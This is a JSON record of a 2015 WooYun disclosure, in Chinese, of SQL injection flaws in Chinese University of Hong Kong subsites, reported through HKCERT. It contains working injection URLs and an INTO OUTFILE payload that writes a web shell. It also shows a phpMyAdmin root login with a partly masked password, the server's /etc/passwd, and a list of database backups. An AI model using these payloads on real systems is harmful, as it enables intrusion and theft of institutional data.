{"id": 84199, "wybug_id": "wooyun-2015-0145559", "wybug_title": "香港中文大学多个分站存在SQL注入漏洞礼包(可获得系统权限)（香港地區）", "wybug_corp": "香港中文大学", "wybug_author": "路人甲", "wybug_date": "2015-10-09 20:14", "wybug_open_date": "2015-11-26 17:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(hkcert香港互联网应急协调中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-26：\t细节向公众公开  简要描述： 香港中文大学多个分站存在SQL注入漏洞礼包(均可获得系统权限)网络架构中部署了WAF等安全设备防御SQL注入，但是都可以Bypass掉 详细说明：  #1 漏洞描述注入漏洞1: http://**.**.**.**/index.php?rSite/Index&sysPageId=141202171042413'\nCDbCommand failed to execute the SQL statement: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' and tm.sys_theme_map_id = 2014092414320100' at line 9. The SQL statement executed was: selectnmi.sys_navbar_menu_item_idfromtbl_navbar_menu_item nmi, tbl_navbar_menu nm, tbl_navbar_menu_item_map nmim, tbl_theme_map tmwherenm.sys_navbar_menu_id = tm.sys_navbar_menu_id andnmim.sys_navbar_menu_id = nm.sys_navbar_menu_id andnmim.sys_navbar_menu_item_id = nmi.sys_navbar_menu_item_id andnmi.sys_page_id = 141202171042413' and tm.sys_theme_map_id = 2014092414320100;\n注入漏洞2:http://**.**.**.**/upload/download.php?id=123'\nError in selecting table.Statement: select * from upload where id='123''Reasons: 1064, You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''123''' at line 1\n   漏洞证明：  # 注入漏洞1利用~ phpmyadminhttp://**.**.**.**/phpmyadmin\n用户：root密码：my2014*****\n~ 进入后台\n\n\navailable databases [7]:[*] cdcol[*] information_schema[*] mysql[*] myunits_cms[*] performance_schema[*] phpmyadmin[*] test\n系统权限：\n[/opt/lampp/ ]$cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shlibuuid:x:100:101::/var/lib/libuuid:/bin/shsyslog:x:101:103::/home/syslog:/bin/falsemessagebus:x:102:105::/var/run/dbus:/bin/falsewhoopsie:x:103:106::/nonexistent:/bin/falselandscape:x:104:109::/var/lib/landscape:/bin/falsesshd:x:105:65534::/var/run/sshd:/usr/sbin/nologinubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bashftp:x:106:112:ftp daemon,,,:/srv/ftp:/bin/falseccl:x:1001:1001:,,,:/home/ccl:/bin/bashaiscl:x:1002:1002:,,,:/home/aiscl:/bin/bashmysql:x:999:999::/home/mysql:/bin/sh\n\n[/opt/lampp/ ]$cat /etc/issueUbuntu 12.04.4 LTS \\n \\l\n# 注入漏洞2利用这个注入漏洞root权限起来的，可以直接into outfile 写入shell\nhttps://**.**.**.**/upload/download.php?id=321' and 1=2 union select 1,2,3,123,5,6,7,8,9,10,11,12,13 into outfile '/home/aic/public_html/upload/123.txt'#\nshell it:http://**.**.**.**/upload/123.txt\n\n很多数据受影响：\n[*] 基本信息 [ \tLinux **.**.**.** 2.6.32-431.23.3.el6.x86_64 #1 SMP Thu Jul 31 17:20:51 UTC 2014 x86_64(mysql) ][/DBbackup/]$ lsWordPress.sql.gzacls.sql.gzaic.sql.gzaic2013.sql.gzaic_account_record.sql.gzaic_mcq_student.sql.gzaic_mcq_student_hawkesbay.sql.gzaic_mcq_student_iceland.sql.gzaic_mcq_student_nepean.sql.gzaic_mcq_student_pune.sql.gzaic_trial1.sql.gzaicca.sql.gzaicps.sql.gzapr.sql.gzatrial.sql.gzaware.sql.gzbasic.sql.gzbasic_dhs_for_nurses_study.sql.gzbasicchest.sql.gzcdaq.sql.gzchronic_pain.sql.gzcir.sql.gzcoda.sql.gzcpd.sql.gzcrt.sql.gzcrt_etsu.sql.gzcrt_warwick.sql.gzelderly.sql.gzenigma3.sql.gzfoldback.sql.gzgaqir.sql.gzhk-a-line-web.sql.gzih.sql.gziir.sql.gzirr2000-2010.sql.gzissps.sql.gzissps2010.sql.gzissps2011.sql.gzissps2012.sql.gzissps2013.sql.gzissps2014.sql.gzktlee.sql.gzlabrequest.sql.gzmatthew.sql.gzmcq3.sql.gzmmr.sql.gzmv_mcq.sql.gzmysql.sql.gznitrous.sql.gzota.sql.gzpcrdb.sql.gzpss.sql.gzsleep.sql.gzsprs.sql.gztest.sql.gztpspre.sql.gztrainee.sql.gzuosa.sql.gzupload.sql.gzvap_study.sql.gzvision_study.sql.gzwk2004.sql.gz[/DBbackup/]$\n   修复方案：  #1 修改WAF的BUG#2 真正的解决掉SQL注入漏洞   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-10-12 17:29 厂商回复： 已將事件通知有關機構 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-10-09 15:51 |    \t\t暴走 \t\t\t( 普通白帽子  |\t\t\t        Rank:518 漏洞数:95        | Wooyun的Rank获取如同Dota冲天梯有过之而无...)\t\t \n  我竟然是SF，不容易.猪哥发飙了，完全停不下来。    \n     2015-10-09 16:10 |    \t\tTon7BrEak \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:54        | 吃苦耐劳，我只会第一个！)\t\t \n  @暴走 你的签名我记得，ID就不记得了··哈哈    \n     2015-10-09 16:16 |    \t\t佳佳佳佳佳  \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:5        | I want to be ur sunshine.)\t\t \n  我猪这是去了大香港度假发漏洞签到么？    \n     2015-10-09 16:19 |    \t\t暴走 \t\t\t( 普通白帽子  |\t\t\t        Rank:518 漏洞数:95        | Wooyun的Rank获取如同Dota冲天梯有过之而无...)\t\t \n  @Ton7BrEak 我就是个无名小卒，每天来这里学习观摩各位大牛的精彩比表演.你能记住我的签名，估计你经常上11玩DOTA...    \n     2015-10-09 16:26 |    \t\tTon7BrEak \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:54        | 吃苦耐劳，我只会第一个！)\t\t \n  @暴走 被你说中了，不过那都是曾经了~已经快一年没玩了。一样一个无名小卒    \n     2015-10-09 17:02 |    \t\t数据流  \t\t\t( 普通白帽子  |\t\t\t        Rank:738 漏洞数:94        | 没关系啊，我们还有音乐)\t\t \n  貌似你发的都是 哈哈...    \n     2015-10-09 19:48 |    \t\tgetshell1993  \t\t\t( 普通白帽子  |\t\t\t        Rank:898 漏洞数:99        | ~！@#￥%……&*)\t\t \n  卧槽....香港专场    \n     2015-10-09 20:22 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3846 漏洞数:296        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  一开始HKCERT没有注册账号，交由第三方合作机构(hkcert香港互联网应急协调中心)处理，重新提醒了一下。    \n     2015-10-09 20:35 |    \t\twy007 \t\t\t( 普通白帽子  |\t\t\t        Rank:108 漏洞数:11        | 其实我是一名卧底...)\t\t \n  猪哥今天这是小宇宙又爆发了...    \n     2015-10-10 09:19 |    \t\tprolog \t\t\t( 普通白帽子  |\t\t\t        Rank:598 漏洞数:113        | Rank:8888 漏洞数:1024 | 低调求发展)\t\t \n  怎么显示路人甲？收到提醒又显示猪猪侠 =_=|||    \n     2015-10-11 17:18 |    \t\tnony \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:14        | Not do is die...)\t\t \n  猪猪侠暴漏了，@猪猪侠   我都关注你了   你再怎么路人甲发布  都会显示是你发的   何必路人甲  让尔等意淫呢    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}